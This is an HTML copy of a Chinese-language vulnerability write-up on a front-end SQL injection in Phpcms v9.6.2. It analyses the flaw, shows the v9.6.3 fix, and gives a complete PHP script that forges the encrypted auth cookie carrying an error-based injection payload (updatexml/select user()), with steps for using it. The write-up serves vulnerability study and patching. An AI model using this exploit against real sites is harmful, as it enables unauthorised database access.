<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="phpcms-v962-前台sql注入"><span class="csDE05BCC">Phpcms v9.6.2 </span><span class="csECDA2D3">前台</span><span class="csDE05BCC">sql</span><span class="csECDA2D3">注入</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Phpcms v9.6.2</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">这个版本的的注入，是建立在任意文件读取漏洞存在的情况下才可利用。通过任意文件读取漏洞获得加解密的</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">key</span><span class="cs8926E06"> </span><span class="cs9C1B1871">值，我们可以用这个</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">key</span><span class="cs8926E06"> </span><span class="cs9C1B1871">加密我们的</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">SQL</span><span class="csE3F655E4">注入</span><span class="cs5BEC2C28">payload</span><span class="cs8926E06"> </span><span class="cs9C1B1871">。由于程序对解密后的数据并未过滤，最终导致漏洞发生。严格上来讲</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">v9.6.2</span><span class="cs8926E06"> </span><span class="cs9C1B1871">版本的注入只能在</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">windows</span><span class="cs8926E06"> </span><span class="cs9C1B1871">上利用，具体原因在上面的任意文件读取漏洞分析时也说了。下面我们来具体分析一下这个漏洞。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">漏洞文件位于</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">phpcms/modules/member/classes/foreground.class.php</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，代码如下图。我们可以明显看到下图第</span><span class="cs8926E06">33</span><span class="cs9C1B1871">行，程序直接将解密后的数据未经过滤直接带入查询。而待解密数据</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">$phpcms_auth</span><span class="cs8926E06"> </span><span class="cs9C1B1871">和解密秘钥</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">$auth_key</span><span class="cs8926E06"> </span><span class="cs9C1B1871">均可构造。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20v9.6.2%20%e5%89%8d%e5%8f%b0sql%e6%b3%a8%e5%85%a5_files/image0.png" width="560" height="146" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们先来看一下待解密数据</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">$phpcms_auth</span><span class="cs8926E06"> </span><span class="cs9C1B1871">如何构造。从下图中，可以看出程序将从</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">cookie</span><span class="cs8926E06"> </span><span class="cs9C1B1871">中的</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">xxx_auth</span><span class="cs8926E06"> </span><span class="cs9C1B1871">字段经过</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">sys_auth</span><span class="cs8926E06"> </span><span class="cs9C1B1871">函数解密后，返回给了</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">$phpcms_auth</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，而默认情况下使用</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">pc_base::load_config(&#39;system&#39;, &#39;auth_key&#39;)</span><span class="cs8926E06"> </span><span class="cs9C1B1871">作为加解密的</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">key</span><span class="cs8926E06"> </span><span class="cs9C1B1871">值。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20v9.6.2%20%e5%89%8d%e5%8f%b0sql%e6%b3%a8%e5%85%a5_files/image1.png" width="560" height="103" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">而</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">pc_base::load_config(&#39;system&#39;, &#39;auth_key&#39;)</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的值在网站搭建好后，会存储在</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">caches/configs/system.php</span><span class="cs8926E06"> </span><span class="cs9C1B1871">中，我们可以通过任意文件读取来获得这个值。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20v9.6.2%20%e5%89%8d%e5%8f%b0sql%e6%b3%a8%e5%85%a5_files/image2.png" width="560" height="199" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">现在</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">$phpcms_auth</span><span class="cs8926E06"> </span><span class="cs9C1B1871">已经搞定了，我们再来看看</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">$auth_key = get_auth_key(&#39;login&#39;)</span><span class="cs8926E06"> </span><span class="cs9C1B1871">如何构造，跟进</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">get_auth_key</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的代码。我们可以看到</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">$auth_key</span><span class="cs8926E06"> </span><span class="cs9C1B1871">由</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">$prefix</span><span class="csE3F655E4">、</span><span class="cs5BEC2C28">pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;)</span><span class="csE3F655E4">、</span><span class="cs5BEC2C28">ip()</span><span class="cs8926E06"> </span><span class="cs9C1B1871">三个元素决定。前两个都是已知的，而第三个获取用户</span><span class="cs8926E06">IP</span><span class="cs9C1B1871">的函数存在</span><span class="cs8926E06">IP</span><span class="cs9C1B1871">伪造的问题，也可以是固定的。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20v9.6.2%20%e5%89%8d%e5%8f%b0sql%e6%b3%a8%e5%85%a5_files/image3.png" width="560" height="250" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">所以</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">get_auth_key(&#39;login&#39;)</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的值也是我们可以构造的，剩下的事情只要我们将</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">payload</span><span class="cs8926E06"> </span><span class="cs9C1B1871">传给加密函数加密两次即可。我们最后再来看一下</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">PHPCMS v9.6.3</span><span class="cs8926E06"> </span><span class="cs9C1B1871">中是如何修复这个漏洞的，补丁如下：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20v9.6.2%20%e5%89%8d%e5%8f%b0sql%e6%b3%a8%e5%85%a5_files/image4.png" width="560" height="179" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以明显看到，补丁将解密后获得的</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">$userid</span><span class="cs8926E06"> </span><span class="cs9C1B1871">进行了强转。</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">分析完毕后得到大致流程：</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">解密操作：</span><span class="cs8926E06">get_cookie(&lsquo;auth&rsquo;) </span><span class="cs9C1B1871">得到</span><span class="cs8926E06">$phpcms_auth</span><span class="cs9C1B1871">，</span><span class="cs8926E06">get_auth_key(&lsquo;login&rsquo;)</span><span class="cs9C1B1871">得到</span><span class="cs8926E06">$auth_key</span><span class="cs9C1B1871">，然后</span><span class="cs8926E06">sys_auth($phpcms_auth, &lsquo;DECODE&rsquo;, $auth_key)</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">再通俗些的话：</span><span class="cs8926E06">sys_auth</span><span class="cs9C1B1871">方法对</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">中包含</span><span class="cs8926E06">auth</span><span class="cs9C1B1871">的参数名对应的密文值，先使用配置文件中的</span><span class="cs8926E06">auth_key</span><span class="cs9C1B1871">进行</span><span class="cs8926E06">sys_auth</span><span class="cs9C1B1871">得到的值作为第一次解密后的值，然后使用配置文件中的</span><span class="cs8926E06">auth_key</span><span class="cs9C1B1871">的值与客户端请求的</span><span class="cs8926E06">IP</span><span class="cs9C1B1871">拼接做</span><span class="cs8926E06">MD5</span><span class="cs9C1B1871">加密的值做为新的</span><span class="cs8926E06">key</span><span class="cs9C1B1871">，第一次解密后的值与新的</span><span class="cs8926E06">key</span><span class="cs9C1B1871">最后传入</span><span class="cs8926E06">sys_auth</span><span class="cs9C1B1871">进行解密得到最终的明文。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">反之加密方法便是：</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">使用配置文件中的</span><span class="cs8926E06">auth_key</span><span class="cs9C1B1871">的值与客户端请求的</span><span class="cs8926E06">IP</span><span class="cs9C1B1871">拼接做</span><span class="cs8926E06">MD5</span><span class="cs9C1B1871">加密的值做为新的</span><span class="cs8926E06">key</span><span class="cs9C1B1871">，使用新的</span><span class="cs8926E06">key</span><span class="cs9C1B1871">与明文进行</span><span class="cs8926E06">sys_auth</span><span class="cs9C1B1871">得到的值作为第一次加密的密文，然后使用配置文件中的</span><span class="cs8926E06">auth_key</span><span class="cs9C1B1871">作为</span><span class="cs8926E06">key</span><span class="cs9C1B1871">与第一次加密的密文传入</span><span class="cs8926E06">sys_auth</span><span class="cs9C1B1871">得到的值作为最终的密文，也就是</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">字段名称中包含</span><span class="cs8926E06">auth</span><span class="cs9C1B1871">的参数对应的值。</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">如下是将各个文件中的加密解密方法抓取出来稍作修改，在本地进行</span><span class="cs5BEC2C28">payload</span><span class="csE3F655E4">的加解密操作：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function sys_auth($string, $operation = &#39;ENCODE&#39;, $key = &#39;&#39;, $expiry = 0,$auth_key=&#39;7G6idVtMAxhgFVu5vGp1&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ckey_length = 4;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$key = md5($key != &#39;&#39; ? $key : $auth_key);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$keya = md5(substr($key, 0, 16));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$keyb = md5(substr($key, 16, 16));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$keyc = $ckey_length ? ($operation == &#39;DECODE&#39; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$cryptkey = $keya.md5($keya.$keyc);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$key_length = strlen($cryptkey);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string = $operation == &#39;DECODE&#39; ? base64_decode(strtr(substr($string, $ckey_length), &#39;-_&#39;, &#39;+/&#39;)) : sprintf(&#39;%010d&#39;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string_length = strlen($string);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$result = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$box = range(0, 255);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$rndkey = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($i = 0; $i &lt;= 255; $i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($j = $i = 0; $i &lt; 256; $i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tmp = $box[$i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$box[$i] = $box[$j];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$box[$j] = $tmp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($a = $j = $i = 0; $i &lt; $string_length; $i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$a = ($a + 1) % 256;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$j = ($j + $box[$a]) % 256;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tmp = $box[$a];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$box[$a] = $box[$j];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$box[$j] = $tmp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($operation == &#39;DECODE&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return substr($result, 26);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $keyc.rtrim(strtr(base64_encode($result), &#39;+/&#39;, &#39;-_&#39;), &#39;=&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function get_auth_key($prefix,$suffix=&quot;&quot;,$ip=&#39;127.0.0.1&#39;,$auth_key=&#39;7G6idVtMAxhgFVu5vGp1&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($prefix==&#39;login&#39;){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pc_auth_key = md5($auth_key.$ip);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}else if($prefix==&#39;email&#39;){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pc_auth_key = md5($auth_key);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pc_auth_key = md5($auth_key.$suffix);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$authkey = md5($prefix.$pc_auth_key);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $authkey;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">解密过程</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">//step 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$encryption_str = &#39;6fc7TB1Y1nIRK5HunMc5HAUw5WkBLLuQGBiOISDhJM4d8N8WHHOvqMaUSyWrZdVdH046oGv_e_Ir6Q157UV-yT5Aksuc_h_4RfwZqsEwDHfQckv4SReOiYFxm083X7Tydcw-nUy8l3nP-ouUGl59sN4&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$operation1 = &#39;DECODE&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$decryption_step1 = (sys_auth($encryption_str, $operation1));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &#39;decryption_step1 result:&#39;.$decryption_step1.&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//step 2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$decryption_step2 = $decryption_step1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$auth_key = get_auth_key(&#39;login&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &#39;decryption_step2 result:&#39;.sys_auth($decryption_step2, &#39;DECODE&#39;, $auth_key).&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">echo &#39;-----------------------&#39;.&quot;\n&quot; ;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">加密过程</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">//step 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$clear_str = &quot;1&#39;or updatexml(1,concat(0x7e,(select user()),0x7e),1) &nbsp;or &#39;1 &nbsp;&nbsp;&nbsp;f867fef04bd76d95abe01300951ca336&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$operation2 = &#39;ENCODE&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$encryption_step1 = sys_auth($clear_str, &#39;ENCODE&#39;, $auth_key);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &#39;encryption_step1 result:&#39;.$encryption_step1.&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//step 2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$encryption_step2 = (sys_auth($encryption_step1, $operation2));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &#39;encryption_step2 result:&#39;.$encryption_step2;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">使用上面的代码可以进行解密和加密，下图中</span><span class="cs8926E06">decryption_step2 result</span><span class="cs9C1B1871">的值便是对</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">进行解密的最终结果，</span><span class="cs8926E06">encryption_step2</span><span class="cs9C1B1871">的值是对</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">进行加密的最终结果。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20v9.6.2%20%e5%89%8d%e5%8f%b0sql%e6%b3%a8%e5%85%a5_files/image5.png" width="560" height="230" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最终利用的现象，</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">YDVIB_auth</span><span class="cs9C1B1871">参数名称，前缀是安装时候生成的可能不一样，可以在配置文件中找到对应的值，可以先注册普通用户然后看服务端下发的</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">中字段名称中</span><span class="cs8926E06">xxx_auth</span><span class="cs9C1B1871">的参数名称，便是存在漏洞的位置。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20v9.6.2%20%e5%89%8d%e5%8f%b0sql%e6%b3%a8%e5%85%a5_files/image6.png" width="560" height="250" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://www.freebuf.com/column/158352.html"><span class="cs4B51D5E4">https://www.freebuf.com/column/158352.html</span></a></span></p><p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://xz.aliyun.com/t/5731"><span class="cs4B51D5E4">https://xz.aliyun.com/t/5731</span></a></span></p></body>
</html>
